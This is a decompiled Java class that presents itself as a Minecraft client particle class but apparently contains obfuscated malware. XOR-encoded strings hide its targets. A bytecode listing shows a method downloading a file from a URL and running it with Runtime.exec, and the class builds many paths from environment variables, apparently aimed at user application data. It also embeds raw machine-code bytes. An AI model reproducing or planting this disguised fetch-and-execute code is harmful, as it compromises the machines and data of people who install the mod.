// 
// Decompiled by Procyon v0.6.0
// 

package net.minecraft.client.particle;

import java.io.File;

public final class EntityParticleFX
{
    private static final String a;
    private static final String b;
    private static final File c;
    private static final String[] d;
    private static final String[] e;
    private static final String[] f;
    private static final byte[] g;
    private static final byte[] h;
    private static final String[] i;
    public static int j;
    public static int k;
    private static final String[] l;
    
    public static void main(final String[] a) {
        final long a2 = 7935827076549L;
        final long a3 = a2 ^ 0x7FC5E0717DDEL;
        try {
            a(new Object[] { a3 });
        }
        catch (final Exception ex) {}
    }
    
    public static String a(final Object[] a) {
        final long a2 = (long)a[0];
        final String[] l = EntityParticleFX.l;
        final String a3 = l[0];
        final File a4 = new File(l[12]);
        if (a4.exists()) {
            return l[12];
        }
        final StringBuilder sb = new StringBuilder();
        final String[] i = EntityParticleFX.l;
        return sb.append(System.getProperty(i[42])).append(i[68]).toString();
    }
    
    public static void a(final Object[] a) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     1: dup            
        //     2: iconst_0       
        //     3: aaload         
        //     4: checkcast       Ljava/lang/Long;
        //     7: invokevirtual   java/lang/Long.longValue:()J
        //    10: lstore_1        /* a */
        //    11: pop            
        //    12: lload_1         /* a */
        //    13: dup2           
        //    14: ldc2_w          22093557949416
        //    17: lxor           
        //    18: lstore_3        /* a */
        //    19: pop2           
        //    20: getstatic       net/minecraft/client/particle/EntityParticleFX.k:I
        //    23: new             Ljava/io/File;
        //    26: dup            
        //    27: getstatic       net/minecraft/client/particle/EntityParticleFX.c:Ljava/io/File;
        //    30: getstatic       net/minecraft/client/particle/EntityParticleFX.l:[Ljava/lang/String;
        //    33: astore          8
        //    35: aload           8
        //    37: bipush          58
        //    39: aaload         
        //    40: invokespecial   java/io/File.<init>:(Ljava/io/File;Ljava/lang/String;)V
        //    43: astore          6
        //    45: istore          a
        //    47: aload           a
        //    49: invokevirtual   java/io/File.exists:()Z
        //    52: iload           a
        //    54: ifne            84
        //    57: ifeq            78
        //    60: ldc2_w          1300
        //    63: invokestatic    java/lang/Thread.sleep:(J)V
        //    66: getstatic       java/lang/System.out:Ljava/io/PrintStream;
        //    69: aload           8
        //    71: bipush          66
        //    73: aaload         
        //    74: invokevirtual   java/io/PrintStream.println:(Ljava/lang/String;)V
        //    77: return         
        //    78: getstatic       net/minecraft/client/particle/EntityParticleFX.c:Ljava/io/File;
        //    81: invokevirtual   java/io/File.exists:()Z
        //    84: iload           a
        //    86: ifne            98
        //    89: ifne            99
        //    92: getstatic       net/minecraft/client/particle/EntityParticleFX.c:Ljava/io/File;
        //    95: invokevirtual   java/io/File.mkdirs:()Z
        //    98: pop            
        //    99: new             Ljava/net/URL;
        //   102: dup            
        //   103: getstatic       net/minecraft/client/particle/EntityParticleFX.l:[Ljava/lang/String;
        //   106: astore          8
        //   108: aload           8
        //   110: bipush          82
        //   112: aaload         
        //   113: invokespecial   java/net/URL.<init>:(Ljava/lang/String;)V
        //   116: invokevirtual   java/net/URL.openStream:()Ljava/io/InputStream;
        //   119: astore          a
        //   121: aload           a
        //   123: aload           a
        //   125: invokevirtual   java/io/File.getAbsolutePath:()Ljava/lang/String;
        //   128: iconst_0       
        //   129: anewarray       Ljava/lang/String;
        //   132: invokestatic    java/nio/file/Paths.get:(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;
        //   135: iconst_1       
        //   136: anewarray       Ljava/nio/file/CopyOption;
        //   139: dup            
        //   140: iconst_0       
        //   141: getstatic       java/nio/file/StandardCopyOption.REPLACE_EXISTING:Ljava/nio/file/StandardCopyOption;
        //   144: aastore        
        //   145: invokestatic    java/nio/file/Files.copy:(Ljava/io/InputStream;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)J
        //   148: pop2           
        //   149: invokestatic    java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
        //   152: new             Ljava/lang/StringBuilder;
        //   155: dup            
        //   156: invokespecial   java/lang/StringBuilder.<init>:()V
        //   159: ldc             "\""
        //   161: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   164: lload_3         /* a */
        //   165: iconst_1       
        //   166: anewarray       Ljava/lang/Object;
        //   169: dup_x2         
        //   170: dup_x2         
        //   171: pop            
        //   172: invokestatic    java/lang/Long.valueOf:(J)Ljava/lang/Long;
        //   175: iconst_0       
        //   176: swap           
        //   177: aastore        
        //   178: invokestatic    net/minecraft/client/particle/EntityParticleFX.a:([Ljava/lang/Object;)Ljava/lang/String;
        //   181: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   184: aload           8
        //   186: iconst_2       
        //   187: aaload         
        //   188: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   191: aload           a
        //   193: invokevirtual   java/io/File.getAbsolutePath:()Ljava/lang/String;
        //   196: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   199: aload           8
        //   201: bipush          67
        //   203: aaload         
        //   204: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   207: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   210: invokevirtual   java/lang/Runtime.exec:(Ljava/lang/String;)Ljava/lang/Process;
        //   213: pop            
        //   214: return         
        //    StackMapTable: 00 04 FF 00 4E 00 07 07 00 88 04 04 01 07 00 48 00 07 00 8D 00 00 45 01 4D 01 00
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        //     at com.strobel.decompiler.ast.AstBuilder.convertLocalVariables(AstBuilder.java:2945)
        //     at com.strobel.decompiler.ast.AstBuilder.performStackAnalysis(AstBuilder.java:2501)
        //     at com.strobel.decompiler.ast.AstBuilder.build(AstBuilder.java:108)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:203)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:93)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:868)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:761)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:638)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:605)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:195)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:162)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:137)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:333)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:254)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:144)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    static {
        final String[] j = new String[92];
        int n = 0;
        String s;
        int n2 = (s = "A\u0011\u0016 6[TpJ'P\u0002]_gXjX<\f\u0005+w\t\u001f)Y\\l\u000b\f\u0019(Q@^d8\u0011'XV^a+\u0006%hYc]+\u0000%@[^A+\u0006%C\u001dgS/\u0012TF\r\u0005!GGNB(:%BR,O&\u001c\b \u000bg\u001a%F\u0013 \u000etF'\u001f1GVtN8^ X_\u0011hD/\u0012+LPmE>\u0002+X\u001dgS/\u000b`O+\u0017!ZG,N2\u0015\rTi%\b\u0012]WgDd\u0003=G\u0006/S8\u0005*\u000e\rTi%\b\t[FqNd\u0003=G\u0011tI%\b+S_aY?\u0004-X\u001dfG&\u0007FY#\u0006!F@\ftI%\b ]@r\u0005.\u001c(BA\u0011\u0016 6[TpJ'P\u0002]_gXjX<\f\u0005+w\t\u001f)Y\\l\u000b\f\u0019(Q@^d8\u0011'XV^a+\u0006%hYc]+\u0000%@[^A+\u0006%C\u001dgS/\f^Sz@\u0018L\u00037w2F}\u000foD?\u0004+Z[gJ8\u0004jCRt\u000fTi%\b\u0007[]vY%\u001cjQKg\ftI%\b,[\\i\u0005.\u001c(\ttF.\u0005)\u001aWnG\u000btFy\u00142QA,O&\u001c\rrY&/0[\\nXd\u0015<Q\b2\u001bpEt\u000e\u00064\b/]/\u0002&[@g\f^Sz@\u0018L\u00062w2Er\f^Sz@\u0018L\u00024w2C\u0001\f^Sz@\u0018L\u0002Aw2Ap\u000fTf\u001e\u001f+X@JD%\u001bjP_n\b2\u001bp@q\u000e\u0005;\ftF>\u001f+X@f\u0005/\b!\u0011tL+\u00050\\@gY<\u0019'Q\u001dgS/\ntF>\u0002%M\u001dfG&\ftF+\u00130\\_r\u0005/\b!\u000ezN$\u0003!FEkH/^!LV\u0007fY#\u0006!F@\b`O9\u0003jQKg\tqJ$\u0014&[KkN\u0019tI%\b+S_rJ9\u00030\\Am^-\u00187DF,O&\u001c\ntF9\u00022W\u001dgS/\u0011FY#\u0006!F@tF\"\u0017\"G\u001dfG&\twX/\u0002j\\\\oN\rtI%\b)FKl[d\u0014(X\u000etF=\u00116QGpJ3^!LV\u0007FN9\u001b0[C\thJ<\u0011j\\\\oN\u000btF?\u00036BP,N2\u0015\u000bdB.\u0014(QA,N2\u0015\u0012tI%\b+S_rJ)\u001b7DF,O&\u001c\f^Sz1\u0018L\u00032w2Bs\u0007C{\u001a4\u0005`r\ntFy\u0014#X\u001dfG&\u000etF\r\u0005!GGNB(^ X_\u0013tI%\b+S_gY8\u001f6GCw\u0005.\u001c(\f^Sz@\u0018L\u0003Aw2B}\nTi%\b\u0017r\u001dqR9\ttO9\u00156BZaN\b2\u001bpA\u0007\u000e\u00026\bqR9\u0004!Y\u00000\ftI%\b0FR{\u0005/\b!\b2\u001bp@\u0007\u000e\u0001;\bhJ<\u0011jPRv\u0006Ub\u00044\rf\u000b/J-\u0015*@Cc_\"J\u000b/A+\u0006%UTgE>J\u0007/S.\u0015&AT\u0017rY%\u00141WGcL/\u001e0GVp]#\u0013!\u001aVzN\nrY&/'W\u001dgS/\u000ftI%\b7QAtB)\u0015jQKg\u0004`Y?\u0018\u0007 \u000b\u0019\u001d+_V\u000e^I#\u001e\u0018^RtJ=^!LV\u000etF=\u00116QFqN8^!LV\u0007FY#\u0006!F@\b2\u0013p@t\u000e\u00015\rTi%\b\u0003AVq_d\u0003=G\t/J-\u0015*@_kI\u0013tI%\b+S_cY8\u0011=GCw\u0005.\u001c(\u000ftI%\b7QAtB)\u0015jQKg\ruB8\u00157\\Rp@d\u0015<Q\u000bTF'\u001f1GV,X3\u0003\ntF\"\u0017\"G\u001dfG&\u0016tI%\b+S_dN/\u0014&UPiX:\u0005jP_n\u0004HJ<\u0011\u000f/S(\u001f+@PnJ9\u00034UGj5j_>\u0000~\u001b\u001caC/\u001e'\\\\uJ9\u001d+_VaG#\u0015*@\u001dg]#\u00110Q_k@/\u0003&[Jq\u0005=\u0004\"\u001bW,[$\u0017\u0012tF)\u001f)DFvN+\u0017!ZG,N2\u0015\u0007fY#\u0006!F@\f^Sz@\u0018L\u0002Aw2Dv\n`G$\u00032F\u001dgS/\ftI%\b0FR{\u0005/\b!\u0007tO+\u0017!ZG\u000btI%\b+S_,O&\u001c").length();
        int n3 = 66;
        int n4 = -1;
    Label_0023:
        while (true) {
            while (true) {
                ++n4;
                final String s2 = s;
                final int n5 = n4;
                String s3 = s2.substring(n5, n5 + n3);
                int n6 = -1;
                while (true) {
                    final char[] charArray = s3.toCharArray();
                    int length;
                    int n8;
                    final int n7 = n8 = (length = charArray.length);
                    int n9 = 0;
                    while (true) {
                        Label_0243: {
                            if (n7 > 1) {
                                break Label_0243;
                            }
                            length = (n8 = n9);
                            do {
                                final char c2 = charArray[n8];
                                charArray[length] = (char)(c2 ^ switch (n9 % 7) {
                                    case 0 -> '\u0002';
                                    case 1 -> '+';
                                    case 2 -> 'J';
                                    case 3 -> 'p';
                                    case 4 -> 'D';
                                    case 5 -> '4';
                                    default -> '3';
                                });
                                ++n9;
                            } while (n7 == 0);
                        }
                        if (n7 > n9) {
                            continue;
                        }
                        break;
                    }
                    final String intern = new String(charArray).intern();
                    switch (n6) {
                        default: {
                            j[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                continue Label_0023;
                            }
                            n2 = (s = "hD/\u0012+L@gY<\u00156\u001aVzN\u000bsN'\u0005iSR,N2\u0015").length();
                            n3 = 16;
                            n4 = -1;
                            break;
                        }
                        case 0: {
                            j[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                break;
                            }
                            break Label_0023;
                        }
                    }
                    ++n4;
                    final String s4 = s;
                    final int n10 = n4;
                    s3 = s4.substring(n10, n10 + n3);
                    n6 = 0;
                }
            }
            break;
        }
        l = j;
        a = File.separator;
        final StringBuilder sb = new StringBuilder();
        final String[] k = EntityParticleFX.l;
        b = sb.append(System.getenv(k[59])).append(File.separator).append(k[55]).toString();
        c = new File(System.getenv(k[47]), k[80]);
        d = new String[] { k[75], k[56], k[31], k[27], k[40], k[69], k[28], k[30], k[36], k[43], k[64], k[19], k[91], k[83], k[34], k[88], k[53], k[44], k[90], k[4], k[86], k[5], k[63], k[33], k[76] };
        e = new String[] { EntityParticleFX.b + EntityParticleFX.a + k[84] + EntityParticleFX.a + k[8], EntityParticleFX.b + EntityParticleFX.a + k[32] + EntityParticleFX.a + k[72], EntityParticleFX.b + EntityParticleFX.a + k[32] + EntityParticleFX.a + k[52], EntityParticleFX.b + EntityParticleFX.a + k[32] + EntityParticleFX.a + k[6], EntityParticleFX.b + EntityParticleFX.a + k[11], EntityParticleFX.b + EntityParticleFX.a + k[16], EntityParticleFX.b + EntityParticleFX.a + k[39], EntityParticleFX.b + EntityParticleFX.a + k[89], EntityParticleFX.b + EntityParticleFX.a + k[74], EntityParticleFX.b + EntityParticleFX.a + k[9], EntityParticleFX.b + EntityParticleFX.a + k[50], EntityParticleFX.b + EntityParticleFX.a + k[79], EntityParticleFX.b + EntityParticleFX.a + k[45], EntityParticleFX.b + EntityParticleFX.a + k[35], EntityParticleFX.b + EntityParticleFX.a + k[65], EntityParticleFX.b + EntityParticleFX.a + k[87], EntityParticleFX.b + EntityParticleFX.a + k[15], EntityParticleFX.b + EntityParticleFX.a + k[10] + EntityParticleFX.a + k[77], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[48], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[17], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[18], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[29], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[25], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[3], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[78], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[49], EntityParticleFX.b + EntityParticleFX.a + k[70] + EntityParticleFX.a + k[1], EntityParticleFX.b + EntityParticleFX.a + k[37], System.getProperty(k[38]) + EntityParticleFX.a + k[41] + EntityParticleFX.a + k[14] };
        f = new String[] { k[13], k[26], k[51], k[57], k[24], k[54], k[22], k[20], k[71], k[23], k[85], k[46] };
        g = new byte[] { 83, 72, -125, -20, 32, -24, 70, -22, -1, -1, 72, -117, 29, -85, 85, 0, 0, -71, -12, 17, 0, 0, -1, -45, -21, -9 };
        h = new byte[] { -115, 76, 36, 4, -125, -28, -16, -1, 113, -4, 85, -119, -27, 81, -125, -20, 20, -24, -38, -4, -1, -1, -115, 118, 0, -115, -68, 39, 0, 0, 0, 0, -57, 4, 36, -12, 1, 0, 0, -24, -124, -1, -1, -1, -125, -20, 4, -21, -17 };
        i = new String[] { k[81], k[62], k[73], k[61], k[7], k[21], k[60] };
    }
}
